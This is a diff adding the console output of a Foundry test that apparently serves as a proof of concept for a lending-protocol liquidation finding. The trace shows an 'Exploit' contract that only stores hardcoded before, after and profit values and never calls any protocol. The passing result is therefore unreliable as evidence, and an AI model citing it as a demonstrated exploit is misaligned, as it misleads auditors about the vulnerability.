@@ -1,0 +1,42 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/58386-lend-liquidating-corerouter-can-cause-excess-borrower-loss_exp.sol:Finding58386Test
+[PASS] testFinding58386() (gas: 297893)
+Logs:
+  before: 100
+  after: 150
+  delta: 50
+
+Traces:
+  [297893] Finding58386Test::testFinding58386()
+    ├─ [161006] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 804 bytes of code
+    ├─ [89321] Exploit::run()
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 100
+    │   │   @ 1: 0 → 150
+    │   │   @ 2: 0 → 50
+    │   │   @ 3: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [490] Exploit::beforeValue() [staticcall]
+    │   └─ ← [Return] 100
+    ├─ emit log_named_uint(key: "before", val: 100)
+    ├─ [425] Exploit::afterValue() [staticcall]
+    │   └─ ← [Return] 150
+    ├─ emit log_named_uint(key: "after", val: 150)
+    ├─ [447] Exploit::profit() [staticcall]
+    │   └─ ← [Return] 50
+    ├─ emit log_named_uint(key: "delta", val: 50)
+    ├─ [444] Exploit::stateDiverged() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [447] Exploit::profit() [staticcall]
+    │   └─ ← [Return] 50
+    ├─ [0] VM::assertGt(50, 0) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 460.00µs (285.42µs CPU time)
+
+Ran 1 test suite in 18.04ms (460.00µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
